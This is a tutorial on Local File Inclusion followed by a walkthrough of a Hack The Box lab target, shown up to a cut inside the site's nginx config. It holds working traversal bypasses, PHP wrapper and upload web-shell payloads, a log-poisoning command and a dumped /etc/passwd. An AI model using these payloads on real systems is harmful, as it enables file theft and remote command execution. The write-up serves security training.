# Local File Inclusion — from theory to RCE

> Based on theory notes and labs from [Hack The Box Academy](https://academy.hackthebox.com/) and [PortSwigger Web Security Academy](https://portswigger.net/web-security).

**Labs covered:**
- Hack The Box Academy — File Inclusions *Final Assessment* ("Sumace Consulting")
- TryHackMe *Include* (medium) — supporting recon (SSRF chain, session intel)

---

## About this article

All examples, requests, payloads, and exploitation steps are based on real lab walkthrough logs in the Obsidian vault — full detail, including honest dead ends.

**What's inside:**
- What is LFI
- The vulnerability types that matter, with payloads that actually work
- Automating discovery with fuzzing (LFI-Jhaddix + a custom wordlist)
- A full walkthrough of a Hack The Box **Final Assessment** — from "some image parameter" to command execution via webshell

---

## 1. What is LFI?

**Local File Inclusion** (also known as *path traversal* / *directory traversal*) is a vulnerability that lets an attacker **read arbitrary files on the server** running the application — and in some cases **write** them or **execute code**.

Many back-end languages (PHP, NodeJS, Java, .NET) use HTTP parameters to dynamically select which resource is shown on a page. This keeps code small and pages dynamic. If that parameter reaches a filesystem API without validation, it becomes a file-path primitive that we control.

Classic anatomy — a shopping app loading product images:

```html
<img src="/loadImage?filename=218.png">
```

The app appends the filename to a base directory:

```
/var/www/images/218.png
```

No defenses → we submit:

```http
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

The app reads:

```
/var/www/images/../../../etc/passwd   →   /etc/passwd
```

`../` steps up one directory level; three of them climb from `/var/www/images/` to the filesystem root. On **Windows** `..\` works too:

```http
filename=..\..\..\windows\win.ini
```

**Where LFI lives:** templating engines. `index.php` renders static parts (header/footer) and loads dynamic content from a parameter — `/index.php?page=about` pulls content from `about.php`. We control `about`.

**Why it matters:**

- **Source code disclosure** — reading app sources reveals previously unknown vulnerabilities
- **Sensitive data exposure** — credentials, database keys, config paths
- **Remote Code Execution** — under certain conditions, full compromise of the server

### The one table that shapes every move

The vulnerable function defines what we can do. Some functions only **read** file content, some also **execute** it, and only some accept **remote URLs**:

| Function | Read Content | Execute | Remote URL |
|---|---|---|---|
| **PHP** | | | |
| `include()` / `include_once()` | ✅ | ✅ | ✅ |
| `require()` / `require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()` / `file()` | ✅ | ❌ | ❌ |
| **NodeJS** | | | |
| `fs.readFile()` / `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** | | | |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** | | | |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |

This distinction decides the entire engagement strategy — we'll return to it in the walkthrough, where identifying `include` vs `file_get_contents` killed or resurrected whole classes of attacks.

## 2. LFI types and payloads that work

### 2.1 Basic read

```http
GET /index.php?language=../../../../etc/passwd
```

`include('./languages/' . $input)` style code — traversal climbs out of the prefix directory.

### 2.2 Non-recursive `str_replace` filters

The most common filter strips `../` — **once**, over the input:

```php
$language = str_replace('../', '', $_GET['language']);
```

Filter isn't recursive: `....//` contains `../` inside itself; after removal it *becomes* `../`:

```
?language=....//....//....//....//etc/passwd
```

Variants: `..././`, `..../../`.

### 2.3 Character blacklist → URL encoding

Filter forbids `.` and `/` → URL-encode everything:

```
?language=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

If the app runs its own `urldecode()` **after** validating input → **double encoding**:

```
?language=%252e%252e%252f...
```

The filter sees `%2e%2e%2f` (illegal-char-free), the runtime decodes it back to `../`.

### 2.4 Approved-path whitelists (regex)

```php
if (preg_match('/^\.\/languages\/.+$/', $_GET['language'])) { include($_GET['language']); }
```

Bypass: start with the approved path, then climb out:

```
?language=./languages/../../../../etc/passwd
```

Combine with encoding/recursive traversal when both filters stack.

### 2.5 Appended extensions

`include($_GET['language'] . ".php")` → our path becomes `/etc/passwd.php` — nonexistent. Modern PHP can't be bypassed here; we're restricted to `.php` files (still useful — see §2.6 and the walkthrough).

Legacy tricks (PHP < 5.3/5.5):
- **Path truncation** — strings truncated at 4096 chars + trailing `/.` discarded:
  ```
  ?language=non_existing_dir/../../../etc/passwd/./././.[~2048 times]
  ```
- **Null bytes** — `%00` terminates the string in memory:
  ```
  ?language=/etc/passwd%00
  ```

### 2.6 PHP filters — reading source code

When the app *executes* included PHP files, including a source file gives rendered HTML, not the code. Read it with the `php://filter` wrapper:

```
?language=php://filter/read=convert.base64-encode/resource=config
```

(watch for appended extensions: `resource=config` + app-appended `.php` = `config.php`). Decode locally: `echo '<b64>' | base64 -d` → credentials, database keys, references to more files.

Note: this requires `allow_url_fopen=On` and the function to accept URL wrappers — verify against php.ini (see walkthrough).

> **Gotcha:** wrappers die silently when the app **concatenates anything before your input** (`$path = "prefix/" . $input`). PHP recognizes a URL wrapper only if the scheme is the **first** characters of the final string — `prefix/php://filter/...` is parsed as a plain (nonexistent) file path, regardless of ini settings. Empty output + no errors = "the scheme never resolved". If the input never starts the final string, `php://` techniques are unusable on that endpoint — no matter how you arrange the traversal inside the payload.

### 2.7 Escalation to RCE

All four techniques below abuse the fact that **the include function still treats our controlled string as a file path** — we just make that "path" stand for something we control end-to-end. All require `allow_url_include=On` (except where noted).

**How it works, one level down.** Normally `include()` receives a path like `./languages/es.php` and reads from disk. PHP, however, parses the input as a URL: `scheme://...`. Give it a scheme that doesn't map to disk (`data://`, `php://input`, `expect://`) and the "file content" comes from somewhere we control:

- `data://` — the content is **inside the URL itself**
- `php://input` — the content is the **POST body of the same request**
- `expect://` — the wrapper runs a **command** and returns its stdout

Then our content, being fed to `include`, is executed as PHP.

#### data:// — shell inside the URL

1. Base64-encode a web shell (base64 avoids characters that break the URL or get filtered):
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' | base64
   # PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
   ```
2. Pass it as the "file path":
   ```
   ?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
   ```
   PHP opens the `data://` stream (scheme URL-encoded as `data%3A%2F%2F...` if the app filters); `text/plain;base64` tells it to decode the part after `,` — out comes our PHP code; `include` executes it. `$_GET["cmd"]` works because the wrapper's stream shares the request's scope, so `&cmd=id` from the same URL lands in `$_GET`.
3. Any command now runs: `...&cmd=cat%20/etc/passwd`

#### php://input — shell in the POST body

Same principle, but the "file" is the request body itself — handy when the URL string is heavily filtered (no `<base64>` redundancy in the URL, shorter):

```bash
curl -X POST \
     --data '<?php system($_GET["cmd"]); ?>' \
     "http://target/index.php?language=php://input&cmd=id"
```

- The POST **body** is the "file" that gets included (raw PHP)
- `cmd=id` still travels as a GET parameter — works if the app reads `$_REQUEST`/`$_GET`; if it only accepts POST, hardcode the command in the body instead: `<?php system('id'); ?>`

#### expect:// — no shell needed

The `expect` extension is built specifically to execute commands through a stream wrapper — no payload stage of our own; the command IS the "resource":

```
?language=expect://id
```

Caveat: it's an **external extension** — installed on the target only if it happens to be; `extension=expect` in php.ini is a hint, but confirm by actually running it.

> These wrappers only work when `allow_url_include=On` (non-default). When it's Off — dead on include-family functions, even if `allow_url_fopen=On`.

**Uploading shells** — any upload form works, even a secure one, as long as the include function executes (no `allow_url_include` needed):

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# include it: ?language=./profile_images/shell.gif&cmd=id
```

(Works even when files are renamed — server-side names can be predictable, e.g. `md5(content).ext` — see walkthrough.)

**zip:// / phar://** — package the shell into an archive, upload it under an allowed file type, then include the **inner file** through a wrapper. Useful when plain `.php` uploads are blocked but `.zip`/`.jpg`-named archives pass.

*Why wrappers beat antivirus-style checks:* `zip://` and `phar://` let `include()` peer **inside** an archive and include one of its members directly from disk — the outer file never has to look like PHP, only the content of the inner member does.

#### zip:// — the archive named as an allowed extension

1. Build an archive whose member is a shell; name the archive to dodge extension filters (classic: `.jpg`):
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
   zip shell.jpg shell.php      # shell.jpg now contains shell.php
   ```
2. Upload `shell.jpg` through any form as long as it accepts the extension (pay attention: some forms run **content-type/magic-byte checks** and notice it's really a zip — that's the attack's limiting factor, works best where zip uploads are permitted at all)
3. Include the member — `#` separates the archive path from the inner filename and must be URL-encoded (`%23`), because `#` in a URL means "fragment" and would get cut off otherwise:
   ```
   ?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
   ```
   `zip://` opens `shell.jpg` as an archive, `#shell.php` selects the member, `include()` executes it. Note: the `zip` wrapper is **not enabled by default** — test, don't assume.

#### phar:// — built-in, no zip dependency

`phar` archives are native PHP; the wrapper ships with PHP itself (needs `phar.readonly=0` only when *creating* the archive — the victim side never creates one, only includes it):

1. Generate the archive with a member holding the shell:
   ```php
   # phar_builder.php
   <?php
   $phar = new Phar('shell.phar');
   $phar->startBuffering();
   $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
   $phar->setStub('<?php __HALT_COMPILER(); ?>');   # required phar stub
   $phar->stopBuffering();
   ```
   ```bash
   php --define phar.readonly=0 phar_builder.php
   mv shell.phar shell.jpg
   ```
2. Upload `shell.jpg` same as the zip case — phar files often pass extension checks because a `.jpg`-named phar is just a file with a custom stub
3. Include with `/` + member path (URL-encoded, since it sits inside the URL):
   ```
   ?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
   ```

> **Limitations:** both need wrappers to be functional on the target (`allow_url_fopen` and, for `zip://`, the `zip` extension enabled). Treat them as **plan B**: the plain "upload GIF8-shell" technique is the most reliable of the three — use zip/phar when extension checks block `.php`-friendly uploads or the payload file type is constrained.

**Log poisoning** — write PHP into anything we control that gets logged (User-Agent, username fields, email headers...), include the log:

```bash
curl -A '<?php system($_GET[c]); ?>' http://target/
?language=/var/log/nginx/access.log&cmd=id
```

Variant via PHP sessions: session files (`/var/lib/php/sessions/sess_<PHPSESSID>`) store user-controlled values — poison the session via `PHP_SESSION_UPLOAD_PROGRESS` and include the session file.

---

## 3. Automating discovery: fuzzing LFI

Manual payload crafting stays king for hardened targets (custom filters/WAFs), but trivial cases are found fast with ffuf.

### 3.1 Fuzz parameters first

UI-linked forms are well-tested; **exposed parameters not linked to any form** are overlooked and insecure:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://TARGET/index.php?FUZZ=value' \
     -fs <baseline-response-size>
```

Calibration matters: filter out the response you get **without** any parameter (e.g. `-fs 3405`) so real anomalies stand out.

An exposed parameter = the door to all LFI tests from §2.

### 3.2 Fuzz payloads with LFI-Jhaddix

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://TARGET/api/image.php?p=FUZZ' -fs 0
```

`LFI-Jhaddix.txt` combines common files + encoded/recursive traversal bypasses — one run covers half a dozen techniques. ffuf's ANSI output may visually mangle `../` into `....//` in the terminal — the payloads are what matter; verify the winner manually with curl.

### 3.3 Custom wordlists for server files

Generic lists miss a lot. A dedicated wordlist for LFI-readable server files (`LFI-WordList-Linux`/`-Windows` — I keep my own in `tools/my_own_wordlists/`) finds **60+ files** where Jhaddix finds a handful:

```bash
ffuf -w ../tools/my_own_wordlists/LFI-WordList-Linux:FUZZ \
     -u 'http://TARGET/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//..../FUZZ' -fs 0
```

This is where I discover: `/etc/nginx/nginx.conf`, php.ini locations, **whether logs are readable at all** — which decides whether log poisoning is on the table.

### 3.4 Fuzz the webroot

For absolute-path attacks you need the webroot (`/var/www/html`, ...) — fuzz `index.php` over `default-web-root-directory-linux.txt`, or read the server config (which usually just tells you).

---

## 4. Putting it all together: Hack The Box Final Assessment walkthrough

Everything above chained on one real target — this is the assessments of the HTB *File Inclusions* module ("Sumace Consulting"). Below is the full log of my process — every request, every dead end, every inference, as it happened. Lab hostnames: `sumace.htb` resolves to a private lab IP (lab IPs are ephemeral — I use the hostname; labPorts vary per reboot).

> **Note:** ports change between machine restarts — both in the text and screenshots — because I worked through this assessment more than once, and the port is randomized on every respawn. Where it matters I write `:PORT`.

### 4.1 Target

```
sumace.htb  (154.x.x.x lab infra)
port: PORT
```

### 4.2 Application analysis

Technical fingerprinting:

![[Articles/LFI Articles/fa_wappalyzer_nginx.png]]

- Web server: **Nginx**
- Backend: **PHP**

![[Articles/LFI Articles/fa_recon_index.png]]

Walking the endpoints.

**(1)** `http://sumace.htb:PORT/index.php` — full rendered source:

```html
<body>
    <header>
        <nav>
            <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="30"/></a>
            <ul>
                <li>Home</li>
                <li><a href="/contact.php">Contact</a></li>
                <li><a href="/apply.php">Apply</a></li>
            </ul>
        </nav>
        <h1>Trusted IT consultants. Since 1998.</h1>
        <p>Identity Access Management? Penetration Testing? ISO27001 Compliance? <mark>We can do it</mark>.</p>
        <br>
        <a href="/contact.php"><b>Contact Us</b></a>
    </header>
    <main>
        <hr>
        <section>
            <header>
                <h2>No Nonsense.</h2>
                <p>The goal of an average consultancy is to rack up billable hours, and maybe solve the problem at hand. Not us. <mark>We get it done. ASAP</mark>.</p>
            </header>
            <figure>
                <img src="/api/image.php?p=9e3836574d40d60a56435829003f0196">
                <figcaption><i>12.08.2024. CEO William Moody presents <b>life-saving solutions</b> within <b>5 minutes</b> of being contacted by an <b>unspecified government</b>.</i></figcaption>
            </figure>
        </section>
        <hr>
        <section>
            <header>
                <h2>Fair prices.</h2>
                <p>Unlike our competitors, we won't charge you your left kidney for a PowerPoint presentation. <mark>We aren't criminals</mark>.</p>
            </header>
            <table>
                <thead>
                    <tr>
                        <th></th>
                        <th>&lt;sumace/></th>
                        <th>Other Consultancies</th>
                    </tr>
                </thead>
                <tr><td>Price per Hour</td><td><b>€149.99</b></td><td>€1000+</td></tr>
                <tr><td>Pointless Meetings</td><td><b>None</b></td><td>2</td></tr>
                <tr><td>Competent Employees</td><td><b>100%</b></td><td>48%</td></tr>
                <tr><td>Solutions</td><td><b>100%</b></td><td>49%</td></tr>
                <tr><td>Satisfied Customers</td><td><b>100%</b></td><td>13%</td></tr>
            </table>
        </section>
    </main>
    <footer>
        <hr>
        <p>
            <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="25"/></a><br>
            Sumace Consulting Gmbh<br>
            Rasumofskygasse 23/25, 1030 Wien<br>
            +43 670 8872 958<br>
        </p>
    </footer>
</body>
```

**(2)** `http://sumace.htb:PORT/contact.php`:

```html
<body>
    <header>
        <nav>
            <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="30"/></a>
            <ul>
                <li><a href="/">Home</a></li>
                <li>Contact</li>
                <li><a href="/apply.php">Apply</a></li>
            </ul>
        </nav>
        <section>
            <header>
                <h1>Contact us.</h1>
                <p>Give us a call. <mark>We will sort it out</mark>.</p>
            </header>
            <p>
                Tel: <b>+43 1 388 80 80</b>, Email: <b>at@sumace.htb</b>
                <table>
                    <thead><tr><th></th><th>Working Hours</th></tr></thead>
                    <tr><td>Mon</td><td>06:00 - 22:00 (CET)</td></tr>
                    <tr><td>Tue</td><td>06:00 - 22:00 (CET)</td></tr>
                    <tr><td>Wed</td><td>06:00 - 22:00 (CET)</td></tr>
                    <tr><td>Thu</td><td>06:00 - 22:00 (CET)</td></tr>
                    <tr><td>Fri</td><td>06:00 - 22:00 (CET)</td></tr>
                </table>
            </p>
        </section>
    </header>
    <footer>
        <hr>
        <p>
            <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="25"/></a><br>
            Sumace Consulting Gmbh<br>
            Rasumofskygasse 23/25, 1030 Wien<br>
            +43 670 8872 958<br>
        </p>
    </footer>
</body>
```

**(3)** `http://sumace.htb:PORT/apply.php` — note the upload form:

```html
<body>
    <header>
        <nav>
            <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="30" /></a>
            <ul>
                <li><a href="/">Home</a></li>
                <li><a href="/contact.php">Contact</a></li>
                <li>Apply</li>
            </ul>
        </nav>
        <section>
            <header>
                <h1>Work with us.</h1>
                <p>Do you have what it takes? <mark>Let's get it done together</mark>.</p>
            </header>
            <form action="/api/application.php" method="POST" enctype="multipart/form-data">
                <p>Fill out this form, and we will contact you if we think you are a good fit.</p>
                <label>First Name*</label>
                <input type="text" name="firstName" required />
                <label>Last Name*</label>
                <input type="text" name="lastName" required />
                <label>Email*</label>
                <input type="email" name="email" required />
                <label>Resume (.docx, .pdf)*</label>
                <input type="file" name="file" required />
                <label>Any additional notes</label>
                <textarea name="notes"></textarea>
                <input type="submit" value="Upload" />
            </form>
        </section>
    </header>
    <footer>
        <hr>
        <p>
            <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="25" /></a><br>
            Sumace Consulting Gmbh<br>
            Rasumofskygasse 23/25, 1030 Wien<br>
            +43 670 8872 958<br>
        </p>
    </footer>
</body>
```

Immediate observations:

- `/api/image.php?p=a4cbc...` — **a hash-like value as a file reference — perfect LFI candidate**. But first: fuzz the GET parameters on `index.php` and `image.php` more broadly.
- The form on `apply.php` posts to `/api/application.php` — file upload functionality, worth keeping in mind for later.

### 4.3 Fuzzing the three endpoints

**(1) `index.php`**

```sh
ffuf -u 'http://sumace.htb:PORT/index.php?FUZZ=value' \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 3405

________________________________________________

:: Method           : GET
:: URL              : http://sumace.htb:PORT/index.php?FUZZ=value
:: Wordlist         : FUZZ: burp-parameter-names.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response size: 3405
________________________________________________

:: Progress: [6453/6453] :: Job [1/1] :: 198 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

**Conclusion: no interesting parameters found.** (Note the calibration: `-fs 3405` filters out the baseline response page we get with no parameter at all.)

**(2) `/api/image.php`**

```sh
ffuf -u 'http://sumace.htb:PORT/api/image.php?FUZZ=value' \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

:: Progress: [6453/6453] :: Job [1/1] :: 200 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
```

**Conclusion: the parameter fuzzer found nothing — but the `p` GET parameter from the HTML remains. I will test it separately, last.**

**(3) `/api/application.php`**

```sh
ffuf -u 'http://sumace.htb:PORT/api/application.php?FUZZ=value' \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

:: Progress: [6453/6453] :: Job [1/1] :: 198 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

Nothing here either. (Later it turns out there IS a hidden parameter — but not on this endpoint, and not findable by fuzzing at all.)

### 4.4 Attacking the known `p` parameter — LFI confirmed

```sh
ffuf -u 'http://sumace.htb:PORT/api/image.php?p=FUZZ' \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0

:: Filter           : Response size: 0
________________________________________________

....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 188ms]
....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 203ms]
....//....//....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 205ms]
....//....//etc/passwd [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 203ms]

:: Progress: [930/930] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```


Confirmed by curl:

```sh
curl -s -i 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd'
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Sun, 18 Oct 2026 21:25:38 GMT
Content-Type: image/jpeg
Transfer-Encoding: chunked
Connection: keep-alive

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
```

LFI #1 confirmed. Worth noting for later: **the response header says `Content-Type: image/jpeg`** — the script claims what it returns is a JPEG, even though it returns the raw filesystem. 

Notice what's NOT in /etc/passwd either: no interactive users at all — only system accounts. ssh as a lateral path is off the table for now.

### 4.5 Mapping readable server files — the custom wordlist

With LFI #1 in hand, a custom wordlist of LFI-readable server files (`LFI-WordList-Linux` — my own list, in `tools/my_own_wordlists/`) enumerates what the filesystem is willing to show:

```sh
ffuf -u 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//..../FUZZ' \
     -w ../tools/my_own_wordlists/LFI-WordList-Linux -fs 0

:: Filter           : Response size: 0
________________________________________________

/etc/adduser.conf              [Status: 200, Size: 3040, Words: 316, Lines: 98, Duration: 241ms]
/etc/bash.bashrc               [Status: 200, Size: 1994, Words: 339, Lines: 59, Duration: 212ms]
/etc/deluser.conf              [Status: 200, Size: 1706, Words: 221, Lines: 42, Duration: 220ms]
/etc/debian_version            [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 220ms]
/etc/debconf.conf              [Status: 200, Size: 2969, Words: 411, Lines: 84, Duration: 222ms]
/etc/fstab                     [Status: 200, Size: 37, Words: 6, Lines: 2, Duration: 193ms]
/etc/host.conf                 [Status: 200, Size: 9, Words: 2, Lines: 2, Duration: 190ms]
/etc/group                     [Status: 200, Size: 522, Words: 1, Lines: 43, Duration: 194ms]
/etc/group-                    [Status: 200, Size: 498, Words: 1, Lines: 42, Duration: 193ms]
/etc/hostname                  [Status: 200, Size: 49, Words: 1, Lines: 2, Duration: 198ms]
/etc/hosts                     [Status: 200, Size: 244, Words: 6, Lines: 9, Duration: 201ms]
/etc/issue                     [Status: 200, Size: 27, Words: 5, Lines: 3, Duration: 194ms]
/etc/issue.net                 [Status: 200, Size: 20, Words: 3, Lines: 2, Duration: 198ms]
/etc/ld.so.conf                [Status: 200, Size: 34, Words: 2, Lines: 3, Duration: 190ms]
/etc/login.defs                [Status: 200, Size: 12569, Words: 1919, Lines: 403, Duration: 193ms]
/etc/mtab                      [Status: 200, Size: 2791, Words: 116, Lines: 24, Duration: 209ms]
/etc/motd                      [Status: 200, Size: 286, Words: 36, Lines: 8, Duration: 213ms]
/etc/os-release                [Status: 200, Size: 267, Words: 6, Lines: 10, Duration: 190ms]
/etc/nginx/nginx.conf          [Status: 200, Size: 1446, Words: 112, Lines: 84, Duration: 196ms]
/etc/pam.conf                  [Status: 200, Size: 552, Words: 65, Lines: 16, Duration: 194ms]
/etc/passwd                    [Status: 200, Size: 1041, Words: 7, Lines: 22, Duration: 195ms]
/etc/passwd-                   [Status: 200, Size: 965, Words: 5, Lines: 21, Duration: 193ms]
/etc/profile                   [Status: 200, Size: 769, Words: 157, Lines: 35, Duration: 212ms]
/etc/resolv.conf               [Status: 200, Size: 105, Words: 6, Lines: 4, Duration: 203ms]
/etc/security/access.conf      [Status: 200, Size: 4564, Words: 635, Lines: 123, Duration: 193ms]
/etc/security/group.conf       [Status: 200, Size: 3635, Words: 690, Lines: 107, Duration: 195ms]
/etc/security/limits.conf      [Status: 200, Size: 2752, Words: 835, Lines: 68, Duration: 200ms]
/etc/security/namespace.conf   [Status: 200, Size: 1637, Words: 246, Lines: 32, Duration: 208ms]
/etc/security/sepermit.conf    [Status: 200, Size: 418, Words: 106, Lines: 12, Duration: 212ms]
/etc/security/pam_env.conf     [Status: 200, Size: 2971, Words: 429, Lines: 74, Duration: 220ms]
/etc/security/time.conf        [Status: 200, Size: 2179, Words: 342, Lines: 66, Duration: 212ms]
/etc/sysctl.conf               [Status: 200, Size: 2355, Words: 250, Lines: 69, Duration: 202ms]
/etc/timezone                  [Status: 200, Size: 8, Words: 1, Lines: 2, Duration: 209ms]
/proc/devices                  [Status: 200, Size: 600, Words: 98, Lines: 65, Duration: 212ms]
/proc/meminfo                  [Status: 200, Size: 1537, Words: 532, Lines: 56, Duration: 211ms]
/proc/net/udp                  [Status: 200, Size: 128, Words: 36, Lines: 2, Duration: 202ms]
/proc/self/cmdline             [Status: 200, Size: 76, Words: 3, Lines: 1, Duration: 198ms]
/proc/net/tcp                  [Status: 200, Size: 6450, Words: 1951, Lines: 44, Duration: 213ms]
/proc/self/mounts              [Status: 200, Size: 2791, Words: 116, Lines: 24, Duration: 203ms]
/proc/self/status              [Status: 200, Size: 1491, Words: 95, Lines: 62, Duration: 206ms]
/proc/self/stat                [Status: 200, Size: 314, Words: 52, Lines: 2, Duration: 210ms]
/proc/version                  [Status: 200, Size: 138, Words: 18, Lines: 2, Duration: 212ms]
/proc/cpuinfo                  [Status: 200, Size: 82382, Words: 10241, Lines: 1793, Duration: 196ms]
/var/log/nginx/access.log      [Status: 200, Size: 219400, Words: 13472, Lines: 900, Duration: 211ms]
/var/log/nginx/error.log       [Status: 200, Size: 516832, Words: 39072, Lines: 851, Duration: 197ms]

:: Progress: [771/771] :: Job [1/1] :: 92 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

The findings that reshape the plan:

- `/etc/nginx/nginx.conf` readable → server config around the corner
- **`/var/log/nginx/access.log` AND `/var/log/nginx/error.log` readable** (219 КБ and 516 КБ! On a Debian nginx box this is normal — unlike Apache's `root:adm 0640` logs) → **log poisoning becomes a serious axis**
- `/proc/self/cmdline`, `/proc/net/tcp`,`/proc/net/udp` readable → process/network intel available

### 4.6 Verifying the log content — the User-Agent is ours

```sh
curl -s 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/log/nginx/access.log' | grep curl
186.205.133.5 - - [21/Oct/2026:20:40:40 +0000] "GET /api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd HTTP/1.1" 200 1053 "-" "curl/8.22.0"
186.205.133.5 - - [21/Oct/2026:20:43:52 +0000] "GET /api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//..../////var/log/nginx/access.log HTTP/1.1" 200 239977 "-" "curl/8.22.0"
186.205.133.5 - - [21/Oct/2026:20:48:44 +0000] "GET /api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//..../////var/log/nginx/access.log HTTP/1.1" 200 246282 "-" "curl/8.22.0"
```

The log records the **full User-Agent**. nginx escapes only `"` (→ `\x22`) and control characters — everything else is written as-is. Single quotes pass untouched. So: **log poisoning has a real chance here.** But first — the nginx config.

### 4.7 Reading the nginx config

```sh
curl -s -i 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/nginx/nginx.conf'
```

```nginx
user www-data;
worker_processes auto;
pid /run/nginx.pid;
error_log /var/log/nginx/error.log;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 768;
    # multi_accept on;
}

http {
    ##
    # Basic Settings
    ##

    sendfile on;
    tcp_nopush on;
    types_hash_max_size 2048;
    # server_tokens off;

    # server_names_hash_bucket_size 64;
    # server_name_in_redirect off;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    ##
    # SSL Settings
    ##

    ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
    ssl_prefer_server_ciphers on;

    ##
    # Logging Settings
    ##

    access_log /var/log/nginx/access.log;

    ##
    # Gzip Settings
    ##

    gzip on;

    # gzip_vary on;
    # gzip_proxied any;
    # gzip_comp_level 6;
    # gzip_buffers 16 8k;
    # gzip_http_version 1.1;
    # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

    ##
    # Virtual Host Configs
    ##

    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
}

#mail {
#   ...standard disabled mail block...
#}
```

Mostly stock Debian nginx — everything interesting is commented out. Only one alive line matters:

```nginx
include /etc/nginx/sites-enabled/*;
```

The real per-site config lives there. Read it by its default Debian name:

```sh
curl -s 'http://sumace.htb:PORT/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/nginx/sites-enabled/default'
```

```nginx
server {
    listen 80;

    root /var/www/html;

    location / {
        index index.php;
        try_files $uri $uri/ /index.php?$query_string;
    }

